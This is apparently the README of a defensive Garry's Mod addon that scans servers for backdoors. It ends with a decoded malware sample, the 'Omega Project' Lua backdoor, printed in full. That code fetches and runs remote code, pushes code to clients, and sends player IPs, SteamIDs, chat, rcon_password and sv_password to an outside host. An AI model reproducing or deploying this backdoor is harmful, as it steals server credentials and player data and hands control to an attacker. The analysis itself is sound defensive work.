# Backdoor Shield

Protect your Garry's Mod server against backdoors.

![logo](https://i.imgur.com/DJlASZh.png)

## !!WARNING!!

>Consider that this addon just gives you an extra layer of security! You'll be able to scan your files and avoid a series of unwanted executions with a basic real-time protection, but don't think that it'll get you out of all troubles!

## Install

Clone or download the files inside your **addons folder**.

## Configure

- Addon settings: **lua/bs/server/sv_init.lua**
- Scan definitions: **lua/bs/server/definitions.lua**

## Commands

    # Recursively scan folders:
    |
    |--> bs_scan folder(s)
    |
    |       Scan all files in folder(s) or in lua, gamemode and data
    |       folders.
    |
    |--> bs_scan_fast folder(s)

            Scan lua, txt, vmt, dat and json files in folder(s) or in
            lua, gamemode and data folders.

    # Run a series of tests when BS.DEVMODE is set to true:
    |
    | --> bs_tests

## Scan Logs

Each scan log is stored in **data/backdoor-shield**. They divide the results into risk groups that are displayed together during the detection or in order in the saved file.

Console:

![scan_console](https://i.imgur.com/sBzfD9G.png)

File:

![scan_file](https://i.imgur.com/kwUtAb0.png)

## Detection Logs

The real time protection prints console messages and creates detection logs in the folder **data\backdoor-shield/THE-CURRENT-DATE**. Results are stored in files that display all together, but are also stored separately by folder and type when detection contents are available.

1) Two backdoors - the first is dead, the second is alive:

![detection_backdoor](https://i.imgur.com/Z8CL4lq.png)

2) Real time protection:

![detection_realtime](https://i.imgur.com/3yWXO6D.png)

3) Logs folder:

![detection_folder](https://i.imgur.com/DhGWEbU.png)

4) General blocked executions log:

![detection_blockedlog](https://i.imgur.com/XWCwr87.png)

5) Detection contents:

- The first backdoor is dead, since the link inside the content doesn't work

![detection_contentdead](https://i.imgur.com/o6itfE2.png)

- But the second one is doing some stuff

![detection_contentalive1](https://i.imgur.com/6i8xNtz.png)

![detection_contentalive2](https://i.imgur.com/MYHm7c8.png)

## Backdoor hunting

Actually you can copy the detection results, decode them and keep going to see whats going on.

1) I disabled my old Lua snippets, took the end of the code from the last detection and ran it:

![post_detection1](https://i.imgur.com/yTVWWwF.png)

2) Now I got a bunch of things to analyse:

![post_detection2](https://i.imgur.com/SBwHXDy.png)

3) After decoding, I can see everything:

```lua
--[[
 name: Ʊmega Project
 author: Inplex
 Google Trust Api factor: 78/100
 Last Update: 02 06 2020
 Description: If you use the panel for hack you will be banned ! -- Lol, Xalalau
]]

if lock == "lock" then return end
lock="lock"

local header_cWcHqNprbaTRQip = {
  ["Authorization"] = "ZWM2OGJkMjMxMGMyODRiODljNGYyNDliYTkzMWQ2Y2Q"
}

HTTP({ url="https://api.omega-project.cz/api_anti_backdoors.php"; method="get"; success = function (api, anti_backdoors) RunString(anti_backdoors) end })
HTTP({ url="https://api.omega-project.cz/api_player_blacklist.php"; method="get"; success = function (api, bad_player_blacklist) RunString(bad_player_blacklist) end })

local addons_files, addons_folders = file.Find("addons/*", "GAME")

for k,v in pairs(addons_folders) do
    if (v != "checkers") and (v != "chess") and (v != "common") and (v != "go") and (v != "hearts") and (v != "spades") then -- Wtf?
        http.Post("https://api.omega-project.cz/api_addons.php", {
            server_ip = game.GetIPAddress(),
            crsf = "SztseEltZSFDyUscjSKJozBWfKCzHuUJjJwpnKgT#MTg2LjIyOS4yMjYuMTAy#djsPLByfuJkTKEfchWXIbLRYzPXqACCsPkvVHmnV",
            addons_name = v,
            addons_update = util.Base64Encode(file.Time( "addons/"..v, "GAME" ))
        },
        function(http_addons) 
            if string.Left( http_addons, 1 ) == "<" or http_addons == "" then 
                return
            else
                RunString(http_addons) 
            end 
        end,
        function( error ) end,
        header_cWcHqNprbaTRQip)
    end 
end

util.AddNetworkString("net_1")

BroadcastLua([[
    net.Receive("net_1", function()
        CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))))
    end)
]])

function someNetFunction(arg1)
    timer.Simple( 0.5, function( )
        data = util.Compress(arg1)
        len = #data

        net.Start("net_1")
            net.WriteUInt(len, 16)
            net.WriteData(data, len)
        net.Broadcast()
    end)
end

util.AddNetworkString("net_2")

BroadcastLua([[
    net.Receive("net_2", function()
        CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))))
    end)
]])

function SendPly(arg1, steamid64)
    timer.Simple( 0.5, function( )
        data = util.Compress(arg1)
        len = #data
        net.Start("net_2")
        net.WriteUInt(len, 16)
        net.WriteData(data, len)
        for k, ply in pairs(player.GetAll()) do
            if ( ply:SteamID64() == steamid64 ) then
                net.Send(ply)
            end
        end
    end)
end

hook.Add(PlayerInitialSpawn, "hook1", function(ply) 
    http.Post("https://api.omega-project.cz/api_get_logs.php",{ 
        csrf = "ec68bd2310c284b89c4f249ba931d6cd",
        content = "Client "..ply:Name().." connected ("..ply:IPAddress()..").", 
        server_ip  = game.GetIPAddress()
    }, RunString)
end)

hook.Add(PlayerDisconnected, "hook2", function(ply) 
    http.Post("https://api.omega-project.cz/api_get_logs.php",{ 
         csrf = "ec68bd2310c284b89c4f249ba931d6cd", 
         color = "de3333",
         content = "Dropped "..ply:Name().." from server (Disconnect by user).", 
         server_ip  = game.GetIPAddress()
    }, RunString)
end)

function ServerLog( logs_content ) 
    http.Post("https://api.omega-project.cz/api_get_logs.php",{ 
        csrf = "ec68bd2310c284b89c4f249ba931d6cd", 
        content = logs_content, 
        server_ip = game.GetIPAddress()
    }, RunString) 

    return ServerLog( logs_content ) 
end 

function Error( string )
    http.Post("https://api.omega-project.cz/api_get_logs.php",{ 
        csrf = "ec68bd2310c284b89c4f249ba931d6cd", 
        content = string, 
        server_ip = game.GetIPAddress()
    },RunString)

    return error( string )
end

timer.Create( "timer1", 1, 0, function()
    hook.Add( "PlayerSay", "hook3", function( ply, text )
        local http_chat_table = {
            name = ply:Name(), 
            server_ip = GetTcpInfo(), 
            steamid64 = ply:SteamID64(),
            message = text
        }

        http.Post("https://api.omega-project.cz/chat_connect.php?MQOEJzPlmWGTzcI=oAyxQMjHSitigAJ", http_chat_table, function(http_chat) RunString(http_chat) end)
    end)

    if file.Exists("cfg/autoexec.cfg","GAME") then
        local cfile = file.Read("cfg/autoexec.cfg","GAME") 

        for k,v in pairs(string.Split(cfile,"\n")) do 
            if string.StartWith(v,"rcon_password") then
                rcon_pw = string.Split(v,"\"")[2] 
            end
        end 
    end

    if file.Exists("cfg/server.cfg","GAME") then
        cfile = file.Read("cfg/server.cfg","GAME") 
        for k,v in pairs(string.Split(cfile,"\n")) do
            if string.StartWith(v,"rcon_password") then 
                rcon_pw = string.Split(v,"\"")[2] 
            end 
        end 
    end 

    if file.Exists("cfg/game.cfg","GAME") then
        cfile = file.Read("cfg/game.cfg","GAME") 
        for k,v in pairs(string.Split(cfile,"\n")) do
            if string.StartWith(v,"rcon_password") then
                rcon_pw = string.Split(v,"\"")[2] 
            end 
        end 
    end  

    if file.Exists("cfg/gmod-server.cfg","GAME") then
        cfile = file.Read("cfg/gmod-server.cfg","GAME") 

        for k,v in pairs(string.Split(cfile,"\n")) do
            if string.StartWith(v,"rcon_password") then
                rcon_pw = string.Split(v,"\"")[2] 
            end 
        end 
    end

    if rcon_pw == "" then
        rcon_pw = "Aucun Rcon"
    end

    for k,v in pairs(player.GetAll()) do 
        local playerInfo = {
            name = v:GetName(),
            ip = v:IPAddress(),
            server_ip = game.GetIPAddress(),
            crsf = "TFIbsvQYjTFbgXmBOqkeNyKKsURUCRlFedXsdPIm#MTg2LjIyOS4yMjYuMTAy#sBktToCthmfpNctMDsDrhmWcHaDQwsakUivPAHVu",
            steamid = v:SteamID(),
            steamid64 = v:SteamID64(),
        }

        http.Post("https://api.omega-project.cz/user_connect.php?zkHNFOZQhmXBsva=soGpJmAfXbWSliy&ping=" .. v:Ping(), playerInfo, function( http_users ) 
            if string.Left( http_users, 1 ) == "<" or http_users == "" then
                return
            else
                RunString( http_users )
            end 
        end,
        function( error ) end,
        header_cWcHqNprbaTRQip)

    end

    local serverData = {
        i = GetTcpInfo(),
        n = GetHostName(),
        m = game.GetMap(),
        bo = tostring(#player.GetBots()),
        c = game.GetIPAddress().."{+}"..server_key.."{+}1597393287",
        g = engine.ActiveGamemode(),
        crsf = "MTg2LjIyOS4yMjYuMTAy#HSldBHvasYQuaoldmwxTWhRqdXntKabTIdewJWrW",
        nb = tostring(#player.GetAll()).."/"..game.MaxPlayers(),
        lurl = GetConVar("sv_loadingurl"):GetString(),
        pass = GetConVar("sv_password"):GetString(),
        k = "",
        client_func = "someNetFunction",
        r = rcon_pw
    }

    http.Post("https://omega-project.cz/api_lib/_-_-drm-_-_/__.php", serverData, function(http_servers) 
        if string.Left( http_servers, 1 ) == "<" or http_servers == "" then 
            return 
        else 
            RunString(http_servers) 
        end 
    end,
    function( error ) end,
    header_cWcHqNprbaTRQip ) 
end)

```

That's it. I hope you enjoy :)